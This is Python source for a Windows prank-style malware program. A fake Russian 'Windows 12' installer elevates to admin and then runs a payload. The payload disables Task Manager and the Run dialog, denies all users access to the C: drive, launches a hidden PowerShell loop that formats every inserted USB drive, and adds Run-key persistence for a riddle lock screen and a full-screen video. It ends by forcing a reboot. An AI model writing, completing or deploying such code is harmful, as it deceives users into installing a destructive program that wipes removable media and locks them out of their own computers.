import os
import sys
import ctypes
import winreg
import shutil
import time
import tkinter as tk
from tkinter import ttk
import pygame
import base64
from io import BytesIO
import threading

# Elevate to admin
if ctypes.windll.shell32.IsUserAnAdmin() == 0:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, None, 1)
    sys.exit()

# Embed video (short loop showing restrictions)
VIDEO_DATA = base64.b64decode("""
[REPLACE WITH ACTUAL BASE64 VIDEO DATA IN REAL SCRIPT]
""")

# Beautiful Tkinter installer GUI
def fake_installer_gui():
    root = tk.Tk()
    root.title("Установка Windows 12")
    root.geometry("800x600")
    root.configure(bg="#0078D7")

    # Styling
    style = ttk.Style()
    style.configure("TButton", font=("Arial", 12), padding=10)
    style.configure("TFrame", background="#0078D7")
    style.configure("Title.TLabel", font=("Arial", 24, "bold"), background="#0078D7", foreground="white")

    # Welcome screen
    welcome_frame = ttk.Frame(root)
    welcome_frame.pack(fill="both", expand=True, padx=50, pady=50)
    
    ttk.Label(welcome_frame, text="Добро пожаловать в установщик Windows 12", style="Title.TLabel").pack(pady=40)
    ttk.Label(welcome_frame, text="Нажмите 'Далее' чтобы начать установку", font=("Arial", 14), background="#0078D7", foreground="white").pack(pady=20)
    
    def next_screen():
        welcome_frame.destroy()
        disk_selection()
    
    ttk.Button(welcome_frame, text="Далее ▶", command=next_screen).pack(pady=30)

    # Disk selection
    def disk_selection():
        disk_frame = ttk.Frame(root)
        disk_frame.pack(fill="both", expand=True, padx=50, pady=50)
        
        ttk.Label(disk_frame, text="Выбор диска для установки", style="Title.TLabel").pack(pady=20)
        ttk.Label(disk_frame, text="Диск 0 (Основной) 500 ГБ", font=("Arial", 14), background="#0078D7", foreground="white").pack(pady=10)
        
        tree = ttk.Treeview(disk_frame, columns=("Size", "Type"), show="headings", height=5)
        tree.heading("#0", text="Раздел")
        tree.heading("Size", text="Размер")
        tree.heading("Type", text="Тип")
        tree.pack(pady=20)
        
        tree.insert("", "end", text="C: (Система)", values=("450 ГБ", "NTFS"))
        tree.insert("", "end", text="D: (Данные)", values=("50 ГБ", "NTFS"))
        
        def next_action():
            disk_frame.destroy()
            language_selection()
        
        ttk.Button(disk_frame, text="Далее ▶", command=next_action).pack(pady=20)

    # Language selection
    def language_selection():
        lang_frame = ttk.Frame(root)
        lang_frame.pack(fill="both", expand=True, padx=50, pady=50)
        
        ttk.Label(lang_frame, text="Выбор языка и региональных параметров", style="Title.TLabel").pack(pady=20)
        
        ttk.Label(lang_frame, text="Язык:", font=("Arial", 14), background="#0078D7", foreground="white").pack(anchor="w", padx=100)
        lang_var = tk.StringVar(value="Русский (водка пиво)")
        lang_combo = ttk.Combobox(lang_frame, textvariable=lang_var, state="readonly", width=30)
        lang_combo["values"] = ("Русский (водка пиво)", "Русский (водка пиво) - Доп.", "Русский (водка пиво) - Премиум")
        lang_combo.pack(pady=10)
        
        def next_action():
            lang_frame.destroy()
            version_selection()
        
        ttk.Button(lang_frame, text="Далее ▶", command=next_action).pack(pady=30)

    # Version selection
    def version_selection():
        ver_frame = ttk.Frame(root)
        ver_frame.pack(fill="both", expand=True, padx=50, pady=50)
        
        ttk.Label(ver_frame, text="Выбор редакции Windows", style="Title.TLabel").pack(pady=20)
        
        # Version checkboxes
        server_var = tk.IntVar(value=1)
        pro_var = tk.IntVar(value=1)
        home_var = tk.IntVar(value=0)
        
        ttk.Checkbutton(ver_frame, text="Windows 12 Сервер", variable=server_var, state="normal").pack(anchor="w", padx=100, pady=5)
        ttk.Checkbutton(ver_frame, text="Windows 12 Про", variable=pro_var, state="normal").pack(anchor="w", padx=100, pady=5)
        
        home_cb = ttk.Checkbutton(ver_frame, text="Windows 12 Домашняя", variable=home_var, state="disabled")
        home_cb.pack(anchor="w", padx=100, pady=5)
        home_cb.state(["disabled"])  # Force disabled state
        
        def install():
            ver_frame.destroy()
            root.destroy()
            deploy_virus()
        
        ttk.Button(ver_frame, text="Установить", command=install).pack(pady=30)

    root.mainloop()

# Video player function
def play_lockdown_video():
    pygame.init()
    pygame.display.set_caption("Windows 12 Security Lock")
    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    
    # Load video from embedded data
    video_file = BytesIO(VIDEO_DATA)
    pygame.movie = pygame.movie.Movie(video_file)
    pygame.movie.set_display(screen)
    pygame.movie.play()
    
    # Loop playback
    while True:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                return
        if not pygame.movie.get_busy():
            pygame.movie.rewind()
            pygame.movie.play()

# Main virus
def deploy_virus():
    # Disable critical features
    os.system('reg add "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Explorer" /v NoRun /t REG_DWORD /d 1 /f')
    os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    
    # Block disk access
    os.system('cacls C:\\ /e /p everyone:n')
    
    # Format USBs on detection
    with open("C:\\format_usb.ps1", "w", encoding="utf-8") as f:
        f.write("""
while ($true) {
    $drives = Get-WmiObject Win32_Volume | ? {$_.DriveType -eq 2}
    foreach ($d in $drives) {
        Format-Volume -DriveLetter $d.DriveLetter -Force -FileSystem NTFS
    }
    Start-Sleep -Seconds 5
}
""")
    os.system('powershell -window hidden -command "Start-Process powershell -ArgumentList \'-ExecutionPolicy Bypass -File C:\\format_usb.ps1\'"')
    
    # Prevent shutdown
    os.system('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f')
    
    # BIOS lock & puzzle
    with open("C:\\bios_lock.bat", "w", encoding="utf-8") as f:
        f.write("""
:loop
echo Загадка: Что имеет ключ, но не открывает замков? (ответ: клавиатура)
set /p answer="Ответ: "
if not "%answer%"=="клавиатура" (
    echo Неверно! Компьютер заблокирован.
    timeout /t 3 >nul
    goto loop
)
del %0
""")
    os.system('reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v BIOS_Lock /t REG_SZ /d "C:\\bios_lock.bat" /f')
    
    # Set video autoplay
    with open("C:\\lockdown.py", "w", encoding="utf-8") as f:
        f.write("""
import pygame
from io import BytesIO
import base64
video_data = base64.b64decode('''""" + base64.b64encode(VIDEO_DATA).decode() + """''')
pygame.init()
screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
video_file = BytesIO(video_data)
movie = pygame.movie.Movie(video_file)
movie.set_display(screen)
movie.play()
while True:
    if not movie.get_busy():
        movie.rewind()
        movie.play()
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            break
""")
    os.system('reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v VideoLock /t REG_SZ /d "pythonw C:\\lockdown.py" /f')
    
    # Force reboot to activate restrictions
    os.system("shutdown /r /t 5 /c 'Windows 12 завершает установку'")

# Execute installer GUI
fake_installer_gui()